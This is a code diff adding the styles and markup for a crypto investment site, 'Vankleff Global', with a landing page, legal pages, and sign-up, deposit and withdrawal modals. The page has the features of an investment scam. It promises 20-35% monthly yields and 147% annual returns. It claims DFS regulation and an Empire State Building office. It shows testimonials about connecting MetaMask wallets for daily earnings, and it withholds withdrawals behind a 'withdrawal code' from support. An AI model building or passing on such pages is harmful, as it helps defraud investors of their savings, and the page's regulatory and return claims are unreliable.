+.ps-row span:last-child{color:#22c55e;}
+.ps-btns{display:flex;gap:10px;}
+.btn-psb{flex:1;padding:13px;background:#1a2200;border-radius:12px;color:#ccc;font-size:14px;}
+.btn-psi{flex:1;padding:13px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;}
+.ct-card{background:#2d3a00;border-radius:16px;padding:18px;margin-bottom:14px;}
+.ct-av{width:52px;height:52px;border-radius:50%;object-fit:cover;border:2px solid #c9a84c;}
+.ct-stats{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0;}
+.ct-stat{background:#1a2200;border-radius:10px;padding:10px;}
+.ct-stat-l{font-size:10px;color:#aaa;}
+.ct-stat-v{font-size:15px;font-weight:700;color:#22c55e;}
+.cp-box{background:#2d3a00;width:100%;max-width:340px;border-radius:16px;padding:24px;}
+.cp-box h3{font-size:16px;font-weight:800;margin-bottom:14px;}
+.cp-inp{width:100%;background:#1a2200;border:1px solid #4a5a00;border-radius:10px;padding:12px;color:#aaa;font-size:13px;margin-bottom:14px;outline:none;}
+.cp-btns{display:flex;gap:10px;}
+.btn-cp-c{flex:1;padding:12px;background:#1a2200;border-radius:10px;color:#ccc;font-size:13px;}
+.btn-cp-s{flex:1;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:13px;font-weight:800;}
+.perf-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:16px;margin-bottom:0;}
+.perf-card{background:#2d3a00;border-radius:14px;padding:16px;}
+.set-card{background:#3a4a00;border-radius:16px;padding:18px;margin-bottom:16px;}
+.set-inp{width:100%;background:#2a3800;border:1px solid #4a5a00;border-radius:10px;padding:12px 14px;color:#fff;font-size:13px;margin-top:6px;outline:none;}
+.set-lbl{font-size:11px;color:#aaa;margin-top:12px;display:block;}
+.btn-save{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:15px;font-weight:800;margin-top:14px;}
+.pref-sec{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:14px;}
+.pref-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #2a2a3e;}
+.pref-row:last-child{border-bottom:none;}
+.toggle{width:44px;height:24px;border-radius:12px;background:#333;position:relative;cursor:pointer;transition:background .2s;}
+.toggle.on{background:#22c55e;}
+.tknob{width:20px;height:20px;border-radius:50%;background:#fff;position:absolute;top:2px;left:2px;transition:left .2s;}
+.toggle.on .tknob{left:22px;}
+.ref-hero{background:#2d3a00;border-radius:16px;padding:24px;text-align:center;margin-bottom:16px;}
+.ref-tiers{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:16px;}
+.ref-tier{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #2a2a3e;}
+.ref-tier:last-child{border-bottom:none;}
+.ref-code{background:#2d3a00;border-radius:14px;padding:16px;margin-bottom:14px;}
+.ref-val{font-size:24px;font-weight:900;color:#22c55e;letter-spacing:3px;margin:8px 0;}
+.ref-link{display:flex;align-items:center;gap:8px;background:#1a2200;border-radius:10px;padding:10px;margin-top:8px;}
+.ref-link-txt{flex:1;font-size:11px;color:#aaa;word-break:break-all;}
+.ref-copy{background:#22c55e;border-radius:8px;padding:7px 12px;color:#fff;font-size:12px;font-weight:700;}
+.ref-stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;}
+.ref-stat{background:#2d3a00;border-radius:12px;padding:14px;text-align:center;}
+.ref-sv{font-size:22px;font-weight:900;color:#c9a84c;}
+.story-card{background:#1c2640;border-radius:14px;padding:16px;margin:0 20px 12px;display:flex;gap:12px;}
+.st-av{width:46px;height:46px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;}
+.gm-box{border-radius:16px;padding:28px 24px;background:#2d3a00;width:100%;max-width:360px;text-align:center;position:relative;}
+.gm-close{position:absolute;top:12px;right:14px;font-size:18px;color:#aaa;background:none;}
+.gm-box h3{font-size:18px;font-weight:800;margin-bottom:10px;}
+.gm-box p{font-size:13px;color:#aaa;line-height:1.6;margin-bottom:18px;}
+.btn-gm{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;margin-bottom:8px;}
+.btn-gmc{width:100%;padding:12px;background:transparent;border:none;color:#aaa;font-size:13px;}
+.conf-box{background:#1a1a2e;text-align:center;max-width:300px;width:90%;border-radius:16px;padding:28px 24px;}
+.conf-btns{display:flex;gap:10px;margin-top:16px;}
+.btn-yes{flex:1;padding:13px;background:#ef4444;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
+.btn-no{flex:1;padding:13px;background:#1a2a1a;border-radius:12px;color:#ccc;font-size:14px;font-weight:600;border:1px solid #333;}
+.suc-box{background:#161b2e;text-align:center;max-width:340px;width:90%;border-radius:16px;padding:28px 24px;position:relative;}
+.suc-close{position:absolute;top:12px;right:16px;font-size:20px;color:#aaa;background:none;}
+.wd-note-box{background:#1a1d26;border:1px solid #c5a059;max-width:380px;width:90%;text-align:center;border-radius:20px;padding:32px 24px;position:relative;}
+.sup-box{background:#2d3a00;width:100%;max-width:380px;text-align:center;border-radius:16px;padding:28px 24px;position:relative;}
+.sup-box .sc{position:absolute;top:12px;right:14px;font-size:18px;color:#aaa;background:none;}
+.sup-row{display:flex;align-items:center;gap:10px;background:#1a2200;border-radius:10px;padding:12px;margin-top:8px;font-size:12px;color:#ccc;}
+.btn-sup{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;}
+.verify-box{background:linear-gradient(160deg,#0a1a10,#0d2218,#071510);border:1px solid #1a4a2a;border-radius:24px;padding:32px 24px;width:90%;max-width:340px;text-align:center;}
+.verify-box h3{font-size:22px;font-weight:900;margin-bottom:8px;}
+.verify-box p{font-size:13px;color:#aaa;line-height:1.6;}
+.verify-count{font-size:28px;font-weight:900;color:#22c55e;margin-top:14px;font-family:monospace;}
+.inv-active-card{background:linear-gradient(135deg,#1a2a1a,#0d1a0d);border:1px solid #22c55e;border-radius:16px;padding:18px;margin-bottom:18px;}
+.inv-active-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;}
+.inv-plan-name{font-size:15px;font-weight:800;color:#c9a84c;}
+.inv-status-badge{font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;color:#fff;background:#22c55e;}
+.inv-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px;}
+.inv-stat{background:rgba(0,0,0,.3);border-radius:10px;padding:10px;}
+.inv-stat-l{font-size:10px;color:#aaa;}
+.inv-stat-v{font-size:16px;font-weight:800;color:#22c55e;margin-top:2px;}
+.inv-progress{background:#0d1a0d;border-radius:10px;height:8px;overflow:hidden;margin-bottom:8px;}
+.inv-progress-bar{height:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border-radius:10px;transition:width .5s;}
+.inv-day-text{font-size:11px;color:#aaa;display:flex;justify-content:space-between;}
+.pancake-loader{display:none;position:fixed;inset:0;z-index:9800;background:rgba(10,5,20,.92);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);align-items:center;justify-content:center;flex-direction:column;gap:0;padding:20px;}
+.pancake-loader.open{display:flex;}
+.pl-scene{width:240px;height:240px;position:relative;display:flex;align-items:flex-end;justify-content:center;margin-bottom:32px;}
+.pl-glow{position:absolute;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(245,179,66,.2),rgba(255,201,227,.06) 40%,transparent 70%);animation:plGlow 2.5s ease-in-out infinite;}
+@keyframes plGlow{0%,100%{transform:scale(1);opacity:.5;}50%{transform:scale(1.15);opacity:.9;}}
+.pl-pan{position:absolute;bottom:8px;width:180px;height:180px;border-radius:50%;background:linear-gradient(145deg,#33333f,#1a1a24);border:5px solid #3a3a48;box-shadow:0 16px 50px rgba(0,0,0,.7),inset 0 -12px 26px rgba(0,0,0,.5),inset 0 6px 14px rgba(255,255,255,.04);}
+.pl-pan::after{content:'';position:absolute;right:-65px;top:50%;transform:translateY(-50%);width:82px;height:20px;background:linear-gradient(to right,#3a3a48,#1a1a24);border-radius:0 12px 12px 0;box-shadow:0 4px 12px rgba(0,0,0,.5);}
+.pl-pancake{position:absolute;bottom:48px;width:100px;height:100px;border-radius:50%;background:radial-gradient(circle at 35% 28%,#FFE082,#F5A623 45%,#D98E04 85%);border:3px solid #C97C04;box-shadow:0 8px 20px rgba(0,0,0,.4),inset 0 -8px 16px rgba(139,69,19,.3),inset 0 8px 12px rgba(255,255,255,.25);animation:plFlip 1.8s cubic-bezier(.45,0,.55,1) infinite;transform-origin:center bottom;}
+.pl-butter{position:absolute;top:32%;left:50%;transform:translateX(-50%);width:26px;height:20px;background:linear-gradient(145deg,#FFFDE7,#FFE082);border-radius:5px;box-shadow:0 2px 5px rgba(0,0,0,.25);}
+.pl-butter::after{content:'';position:absolute;top:3px;left:3px;right:3px;height:4px;background:rgba(255,255,255,.4);border-radius:2px;}
+@keyframes plFlip{0%{transform:translateY(0) rotateX(0deg) scale(1);}30%{transform:translateY(-95px) rotateX(180deg) scale(.95);}50%{transform:translateY(-95px) rotateX(180deg) scale(.95);}70%{transform:translateY(0) rotateX(360deg) scale(1);}85%{transform:translateY(-6px) rotateX(360deg) scale(1.02);}100%{transform:translateY(0) rotateX(360deg) scale(1);}}
+.pl-steam{position:absolute;bottom:60px;width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.3);animation:plSteam 2s ease-out infinite;}
+.pl-steam:nth-child(4){left:40%;animation-delay:0s;}
+.pl-steam:nth-child(5){left:50%;animation-delay:.6s;}
+.pl-steam:nth-child(6){left:60%;animation-delay:1.2s;}
+@keyframes plSteam{0%{transform:translateY(0) scale(.5);opacity:0;}20%{opacity:.5;}100%{transform:translateY(-60px) scale(1.5);opacity:0;}}
+.pl-msg{text-align:center;color:#fff;font-size:15px;font-weight:600;max-width:340px;line-height:1.6;padding:0 16px;}
+.pl-sub{color:#aaa;font-size:12px;margin-top:10px;text-align:center;display:flex;align-items:center;justify-content:center;gap:4px;}
+.pl-dots{display:inline-flex;gap:4px;margin-left:4px;}
+.pl-dots span{width:5px;height:5px;border-radius:50%;background:#22c55e;animation:plDot 1.4s infinite;}
+.pl-dots span:nth-child(2){animation-delay:.2s;}
+.pl-dots span:nth-child(3){animation-delay:.4s;}
+@keyframes plDot{0%,80%,100%{opacity:.3;transform:scale(.8);}40%{opacity:1;transform:scale(1.2);}}
+.pl-actions{display:flex;gap:10px;margin-top:22px;justify-content:center;flex-wrap:wrap;}
+.pl-btn-open{padding:13px 22px;background:linear-gradient(135deg,#22c55e,#16a34a);border:none;border-radius:12px;color:#fff;font-size:14px;font-weight:800;cursor:pointer;display:flex;align-items:center;gap:7px;}
+.pl-btn-cancel{padding:13px 22px;background:transparent;border:1px solid #555;border-radius:12px;color:#aaa;font-size:14px;font-weight:600;cursor:pointer;}
+.goog-te-banner-frame{display:none!important;visibility:hidden!important;height:0!important;width:0!important;opacity:0!important;}
+.goog-te-gadget-icon{display:none!important;}
+.goog-tooltip{display:none!important;}
+.goog-tooltip:hover{display:none!important;}
+.goog-text-highlight{background-color:transparent!important;border:none!important;box-shadow:none!important;opacity:1!important;filter:none!important;}
+iframe.goog-te-banner-frame{display:none!important;visibility:hidden!important;height:0!important;}
+.goog-te-balloon-frame{display:none!important;visibility:hidden!important;}
+#goog-gt-tt{display:none!important;visibility:hidden!important;}
+.goog-te-spinner-pos{display:none!important;}
+div.goog-te-gadget{display:none!important;font-size:0!important;}
+.goog-logo-link{display:none!important;}
+.goog-te-gadget span{display:none!important;}
+.skiptranslate{display:none!important;}
+.goog-te-menu-frame{display:none!important;}
+.goog-te-menu2{display:none!important;}
+body{top:0px!important;position:static!important;}
+</style>
+</head>
+<body>
+
+<div id="risk-overlay">
+  <div class="risk-box">
+    <div class="risk-icon">⚠️</div>
+    <h2>Important Risk Disclosure</h2>
+    <p>Trading digital assets involves <strong>significant risk of loss</strong> and is not suitable for all investors.</p>
+    <p style="color:#888;font-size:12px;">You may lose some or all of your capital.</p>
+    <button class="btn-risk" onclick="document.getElementById('risk-overlay').style.display='none'">I Understand and Accept</button>
+  </div>
+</div>
+
+<div class="lang-fixed" id="lang-sel">
+  <button class="lang-trigger" onclick="toggleLang()">🌐 <span id="lc">EN</span> ▲</button>
+  <div class="lang-drop" id="lang-drop">
+    <div class="lang-opt" onclick="setLang('EN')">🇺🇸 English</div>
+    <div class="lang-opt" onclick="setLang('FR')">🇫🇷 Français</div>
+    <div class="lang-opt" onclick="setLang('ES')">🇪🇸 Español</div>
+    <div class="lang-opt" onclick="setLang('DE')">🇩🇪 Deutsch</div>
+    <div class="lang-opt" onclick="setLang('PT')">🇧🇷 Português</div>
+    <div class="lang-opt" onclick="setLang('AR')">🇸🇦 العربية</div>
+    <div class="lang-opt" onclick="setLang('ZH')">🇨🇳 中文</div>
+    <div class="lang-opt" onclick="setLang('JA')">🇯🇵 日本語</div>
+    <div class="lang-opt" onclick="setLang('KO')">🇰🇷 한국어</div>
+    <div class="lang-opt" onclick="setLang('RU')">🇷🇺 Русский</div>
+    <div class="lang-opt" onclick="setLang('TR')">🇹🇷 Türkçe</div>
+    <div class="lang-opt" onclick="setLang('HI')">🇮🇳 हिन्दी</div>
+    <div class="lang-opt" onclick="setLang('SW')">🇰🇪 Swahili</div>
+    <div class="lang-opt" onclick="setLang('ID')">🇮🇩 Bahasa</div>
+    <div class="lang-opt" onclick="setLang('VI')">🇻🇳 Tiếng Việt</div>
+    <div class="lang-opt" onclick="setLang('IT')">🇮🇹 Italiano</div>
+    <div class="lang-opt" onclick="setLang('NL')">🇳🇱 Nederlands</div>
+  </div>
+</div>
+
+<div id="page-landing" class="page active">
+  <div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span><span class="brand-sub">New York · Est. 2015</span></div></div><div class="nav-btns"><button class="btn-login" onclick="openAuth('signin')">Member Login</button><button class="btn-open" onclick="openAuth('create')">Open Account</button></div></div>
+  <div class="hero"><div class="hero-bg"></div><div class="hero-overlay"></div><div class="hero-content"><div class="hero-badge">🏢 350 Fifth Avenue · Empire State Building · New York, NY</div><h1>Institutional Crypto Management <span class="g">from the Heart of</span> <span class="b">New York.</span></h1><p>Operating from the Empire State Building, Vankleff Global provides Wall Street-grade execution and secure digital asset growth for investors worldwide.</p></div></div>
+  <div class="about-curtain">
+    <div class="stats-grid"><div class="stat-card"><div class="stat-val">$4.2B+</div><div class="stat-lbl">Assets Under Management</div></div><div class="stat-card"><div class="stat-val">18,400+</div><div class="stat-lbl">Active Private Investors</div></div><div class="stat-card"><div class="stat-val">147%</div><div class="stat-lbl">Average Annual Return</div></div><div class="stat-card"><div class="stat-val">9+</div><div class="stat-lbl">Years of Operation</div></div></div>
+    <div class="section"><div class="sec-label">ABOUT VANKLEFF GLOBAL</div><h2>A New York Institution Since 2015</h2><p>Founded by former Goldman Sachs and JP Morgan executives, managing digital assets for high-net-worth clients across 47 countries.</p><ul class="check-list"><li>Regulated by New York State DFS</li><li>SOC 2 Type II Certified</li><li>Fully segregated client accounts</li><li>24/7 institutional-grade support</li></ul></div>
+    <div class="hq-card"><div class="hq-top"><div class="hq-icon">🏢</div><div><div style="font-size:15px;font-weight:800;">Empire State Building</div><div style="font-size:11px;color:#aaa;">New York Global HQ</div></div></div><table><tr><td>Address</td><td>350 Fifth Ave, 85th Floor, NY 10118</td></tr><tr><td>Founded</td><td>2015</td></tr><tr><td>Employees</td><td>240+</td></tr><tr><td>Support</td><td><a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></td></tr></table></div>
+    <div class="section"><div class="sec-label">INVESTMENT PLANS</div><h2>Choose Your Growth Tier</h2>
+      <div class="plan-card"><div style="font-size:11px;color:#aaa;">Institutional Yield</div><div style="font-size:18px;font-weight:800;">From $1,000</div><div class="plan-yield">20%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
+      <div class="plan-card pop"><div class="plan-badge pb-green">Popular</div><div style="font-size:11px;color:#aaa;">Strategic Alpha</div><div style="font-size:18px;font-weight:800;">From $10,000</div><div class="plan-yield">25%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
+      <div class="plan-card best"><div class="plan-badge pb-blue">Best</div><div style="font-size:11px;color:#aaa;">Elite Managed</div><div style="font-size:18px;font-weight:800;">From $50,000+</div><div class="plan-yield">35%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
+    </div>
+    <div class="section" style="background:#0a0f1a;"><div class="sec-label" style="text-align:center;">CLIENT FEEDBACK</div><h2 style="text-align:center;">Institutional Feedback</h2>
+      <div class="trust-card"><img class="trust-av" src="https://i.ibb.co/0pDwjgR4/1785214812149.jpg" alt="Chiara"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Connected MetaMask and daily earnings started flowing. $2,400/day average."</p><div class="trust-name">Chiara Romano</div><div class="trust-role">Investor</div><div class="trust-loc">🇮🇹 Italy</div></div></div>
+      <div class="trust-card"><img class="trust-av" src="https://i.ibb.co/4RJv4bqF/file-00000000066081f4bcc556545d1aec65.png" alt="Carlos"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"VIP signals turned $10k into $28k in one month."</p><div class="trust-name">Carlos Rivera</div><div class="trust-role">Investor</div><div class="trust-loc">🇲🇽 Mexico</div></div></div>
+      <div class="trust-card"><img class="trust-av" src="https://i.ibb.co/fjTKBvn/IMG-20260728-051148.png" alt="Elena"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Connected my wallet and earned $2,800 in just one day."</p><div class="trust-name">Elena Petrova</div><div class="trust-role">Investor</div><div class="trust-loc">🇷🇺 Russia</div></div></div>
+    </div>
+    <div class="cta-box"><div class="cta-logo">V</div><div style="font-size:10px;color:#c9a84c;font-weight:700;letter-spacing:2px;margin-bottom:8px;">PRIVATE MEMBERSHIP</div><h2 style="font-size:26px;font-weight:900;margin-bottom:10px;">Ready to Grow Your Digital Assets?</h2><p style="color:#aaa;font-size:12px;margin-bottom:22px;">Join 18,400+ private investors who trust Vankleff Global.</p><button class="btn-gold" onclick="openAuth('create')">Open Account →</button><button class="btn-secondary" onclick="openAuth('signin')">Member Login ›</button></div>
+    <footer><div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;"><div class="logo-box" style="width:34px;height:34px;font-size:14px;">V</div><span style="font-size:14px;font-weight:800;color:#c9a84c;letter-spacing:1px;">VANKLEFF GLOBAL</span></div><p style="color:#ccc;font-size:11px;line-height:1.7;margin-bottom:18px;">Institutional digital asset management from the Empire State Building, New York.</p><h4>Contact</h4><ul><li>350 Fifth Avenue, 85th Floor, New York, NY 10118</li><li><a href="mailto:support@vankleffglobal.com" class="femail">support@vankleffglobal.com</a></li></ul><h4>Legal</h4><ul><li><a href="#" onclick="showPage('terms')">Terms of Service</a></li><li><a href="#" onclick="showPage('privacy')">Privacy Policy</a></li><li><a href="#" onclick="openAuth('signin')">Member Login</a></li><li><a href="#" onclick="openAuth('create')" style="color:#22c55e;">Open Account</a></li></ul></footer>
+  </div>
+</div>
+
+<div id="page-terms" class="page"><div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div><button class="btn-login" onclick="showPage('landing')">← Back</button></div><div class="legal-page"><h1>Terms of Service</h1><div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div><h2>1. Acceptance</h2><p>By using the Vankleff Global platform, you agree to these Terms.</p><h2>2. Eligibility</h2><p>You must be at least 18 years of age and legally capable of entering into contracts.</p><h2>3. Risk Disclosure</h2><p>Trading digital assets involves substantial risk of loss. Past performance is not indicative of future results.</p><h2>4. Prohibited Activities</h2><p>You may not use the Platform for illegal purposes, market manipulation, or misrepresent your identity.</p><h2>5. Governing Law</h2><p>These Terms are governed by the laws of the State of New York.</p><h2>6. Contact</h2><p>350 Fifth Avenue, 85th Floor, New York, NY 10118. <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></p></div></div>
+<div id="page-privacy" class="page"><div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div><button class="btn-login" onclick="showPage('landing')">← Back</button></div><div class="legal-page"><h1>Privacy Policy</h1><div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div><h2>1. Introduction</h2><p>Vankleff Global LLC is committed to protecting your privacy.</p><h2>2. Information We Collect</h2><p>Name, email, phone, country, financial information, IP addresses, and usage data via cookies.</p><h2>3. How We Use It</h2><p>To provide the platform, process transactions, verify identity, and comply with legal obligations.</p><h2>4. Security</h2><p>We implement AES-256 encryption, multi-factor authentication, and regular security audits.</p><h2>5. Your Rights</h2><p>Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a> to access, correct, or delete your data.</p></div></div>
+
+<div class="modal-ov" id="auth-modal" onclick="if(event.target===this)closeAuth()"><div class="modal-box"><button class="modal-close" onclick="closeAuth()">✕</button><div class="modal-logo">V</div><div class="modal-title">VANKLEFF GLOBAL</div><div class="modal-sub">Institutional Digital Asset Management</div><div class="tab-row"><button class="tab-btn" id="tab-c" onclick="switchTab('create')">Create Account</button><button class="tab-btn" id="tab-s" onclick="switchTab('signin')">Sign In</button></div><div id="form-create"><div class="fg"><span class="fi">👤</span><input type="text" id="c-name" placeholder="Full Name"/></div><div class="fg"><span class="fi">✉️</span><input type="email" id="c-email" placeholder="Email Address"/></div><div class="phone-row"><select class="phone-sel"><option>🇺🇸 +1</option><option>🇬🇧 +44</option><option>🇳🇬 +234</option><option>🇦🇪 +971</option><option>🇮🇳 +91</option><option>🇬🇭 +233</option></select><div class="fg" style="flex:1;margin-bottom:0;"><span class="fi">📞</span><input type="tel" id="c-phone" placeholder="Phone Number"/></div></div><div class="fg"><span class="fi">🔒</span><input type="password" id="c-pass" placeholder="Password (min 8 characters)"/></div><div class="enc-note">🔒 Protected by <a href="#">256-bit encryption</a>.</div><div id="c-otp-wrap" style="display:none;margin-bottom:12px;"><div style="font-size:12px;color:#22c55e;font-weight:700;margin-bottom:8px;text-align:center;">📧 A verification code was sent to your email</div><div class="fg"><span class="fi">🔑</span><input type="text" id="c-otp" maxlength="6" inputmode="numeric" placeholder="Enter 6-digit code"/></div><div class="resend-otp" onclick="resendSignupOTP()">Resend code</div></div><div class="loading-spinner" id="load-create"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;margin-top:8px;">Creating your account...</p></div><button class="btn-submit" id="btn-create" onclick="doLoginCreate()">Create Private Account →</button></div><div id="form-signin" style="display:none;"><div class="fg"><span class="fi">✉️</span><input type="email" id="s-email" placeholder="Email Address"/></div><div class="fg"><span class="fi">🔒</span><input type="password" id="s-pass" placeholder="Password"/></div><div class="enc-note">🔒 Protected by <a href="#">256-bit encryption</a>.</div><div class="loading-spinner" id="load-signin"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;margin-top:8px;">Signing you in...</p></div><button class="btn-submit" id="btn-signin" onclick="doLoginSignIn()">Sign In to Dashboard →</button></div></div></div>
+
+<div class="cp-ov" id="cp-ov"><div class="cp-box"><h3 id="cp-t">Copy Trader</h3><input class="cp-inp" type="number" id="cp-amt" placeholder="Min $500"/><div class="cp-btns"><button class="btn-cp-c" onclick="document.getElementById('cp-ov').classList.remove('open')">Cancel</button><button class="btn-cp-s" onclick="startCopy()">Start Copying</button></div></div></div>
+<div class="sup-ov" id="sup-ov" onclick="if(event.target===this)document.getElementById('sup-ov').classList.remove('open')"><div class="sup-box"><button class="sc" onclick="document.getElementById('sup-ov').classList.remove('open')">✕</button><div style="font-size:52px;margin-bottom:14px;">💬</div><h3 style="font-size:18px;font-weight:800;margin-bottom:8px;">Need Help?</h3><p style="font-size:13px;color:#aaa;margin-bottom:20px;line-height:1.6;">Our support team is available 24/7 to assist you.</p><a href="mailto:support@vankleffglobal.com" class="btn-sup">✉ Contact Support</a><button class="btn-sup" onclick="if(typeof Tawk_API!=='undefined'&&Tawk_API.toggle){Tawk_API.toggle()}">💬 Live Chat</button><p style="font-size:11px;color:#666;margin-top:8px;">support@vankleffglobal.com</p><div class="sup-row"><span>🕐</span><div><div style="font-weight:600;">Response Time</div><div style="font-size:11px;color:#aaa;">Within 1-2 hours</div></div></div><div class="sup-row"><span>🔒</span><div><div style="font-weight:600;">Secure Communication</div><div style="font-size:11px;color:#aaa;">All communications are encrypted</div></div></div></div></div>
+<div class="pm-ov" id="pm-ov" onclick="if(event.target===this)closePM()"><div style="background:#161b2e;border-radius:20px;padding:26px 22px;width:92%;max-width:400px;position:relative;"><button class="modal-close" onclick="closePM()">✕</button><div style="width:64px;height:64px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:26px;margin:0 auto 10px;" id="pm-avatar">V</div><div style="font-size:16px;font-weight:800;text-align:center;" id="pm-username">Member</div><div style="color:#22c55e;font-size:12px;text-align:center;margin-bottom:4px;">✓ Verified</div><div style="font-size:11px;color:#aaa;text-align:center;margin-bottom:14px;">LIVE MARKET</div><div id="pm-balance" style="font-size:32px;font-weight:900;color:#22c55e;text-align:center;margin-bottom:4px;">$100.00</div><div style="font-size:11px;color:#aaa;text-align:center;margin-bottom:18px;">Available Balance</div><button style="width:100%;padding:13px;border-radius:12px;font-size:13px;font-weight:700;background:#1a2a1a;color:#ccc;margin-bottom:10px;" onclick="closePM();showDash('settings')">⚙ Account Settings</button><button style="width:100%;padding:13px;border-radius:12px;font-size:13px;font-weight:700;background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.3);" onclick="closePM();showConf()">↪ Logout</button></div></div>
+<div class="conf-ov" id="conf-ov"><div class="conf-box"><h3>Log Out?</h3><p style="font-size:13px;color:#aaa;margin-top:8px;">Are you sure you want to log out?</p><div class="conf-btns"><button class="btn-no" onclick="document.getElementById('conf-ov').classList.remove('open')">No</button><button class="btn-yes" onclick="doLogout()">Yes, Logout</button></div></div></div>
+<div class="gm-ov" id="gm-ov"><div class="gm-box"><button class="gm-close" onclick="closeGM()">✕</button><h3 id="gm-t">Notice</h3><p id="gm-b"></p><button class="btn-gm" id="gm-btn" onclick="closeGM()">OK</button><button class="btn-gmc" id="gm-c" onclick="closeGM()" style="display:none">Cancel</button></div></div>
+<div class="suc-ov" id="suc-ov"><div class="suc-box"><button class="suc-close" onclick="document.getElementById('suc-ov').classList.remove('open');showDash('main')">✕</button><div style="font-size:50px;margin-bottom:14px;">✅</div><h3 style="font-size:18px;font-weight:800;color:#22c55e;margin-bottom:10px;">Deposit Received!</h3><p style="font-size:13px;color:#aaa;line-height:1.6;">Your on-chain deposit has been verified and credited to your account.</p></div></div>
+<div class="wd-note-ov" id="wd-note-ov"><div class="wd-note-box"><div style="font-size:44px;margin-bottom:12px;">🔐</div><h3 style="font-size:17px;font-weight:800;color:#d4b476;margin-bottom:12px;">Please Note</h3><p style="font-size:13px;color:#fff;line-height:1.7;margin-bottom:20px;">To retrieve your withdrawal code, please contact our support team at <a href="mailto:support@vankleffglobal.com" style="color:#28a745;font-weight:700;">support@vankleffglobal.com</a>.</p><button class="btn-gm" onclick="document.getElementById('wd-note-ov').classList.remove('open')">OK, Got It</button></div></div>
+<div class="proc-ov" id="proc-ov"><div style="background:linear-gradient(160deg,#0a1a10,#0d2218,#071510);border:1px solid #1a4a2a;border-radius:24px;padding:32px 24px;width:90%;max-width:340px;text-align:center;"><div style="width:80px;height:80px;background:radial-gradient(circle,#1a4a2a,#0a2018);border:2px solid #22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 16px;">🔗</div><div style="display:inline-flex;align-items:center;gap:6px;border:1px solid #22c55e;border-radius:20px;padding:5px 14px;font-size:11px;font-weight:700;color:#22c55e;margin-bottom:14px;">● AWAITING ON-CHAIN</div><h3 style="font-size:22px;font-weight:900;margin-bottom:8px;">Processing Deposit</h3><p id="proc-net-txt" style="font-size:13px;color:#aaa;margin-bottom:20px;">Awaiting on-chain confirmation.</p><div style="border-top:1px solid #1a3a22;margin-bottom:20px;"><div style="display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #1a3a22;font-size:13px;"><span style="color:#888;">Asset</span><span id="proc-asset" style="color:#fff;font-weight:600;">USDT</span></div><div style="display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #1a3a22;font-size:13px;"><span style="color:#888;">Network</span><span id="proc-network" style="color:#fff;font-weight:600;">BEP-20</span></div><div style="display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px solid #1a3a22;font-size:13px;"><span style="color:#888;">Quantity</span><span id="proc-qty" style="color:#fff;font-weight:600;">1,000.0000 USDT</span></div><div style="display:flex;justify-content:space-between;padding:11px 0;font-size:13px;"><span style="color:#888;">Status</span><span id="proc-status" style="color:#f59e0b;">Awaiting</span></div></div><button style="width:100%;padding:15px;background:linear-gradient(135deg,#16a34a,#22c55e);border-radius:14px;color:#fff;font-size:15px;font-weight:800;" onclick="document.getElementById('proc-ov').classList.remove('open');showDash('main')">Back to Dashboard</button></div></div>
+<div class="verify-ov" id="verify-ov"><div class="verify-box"><div style="width:60px;height:60px;margin:0 auto 20px;"><div class="spinner-ring" style="margin:0;"></div></div><h3 id="verify-title">Verifying...</h3><p id="verify-msg" style="font-size:13px;color:#aaa;line-height:1.6;margin-top:8px;">Processing your request. Please wait.</p><div class="verify-count" id="verify-count">15</div></div></div>
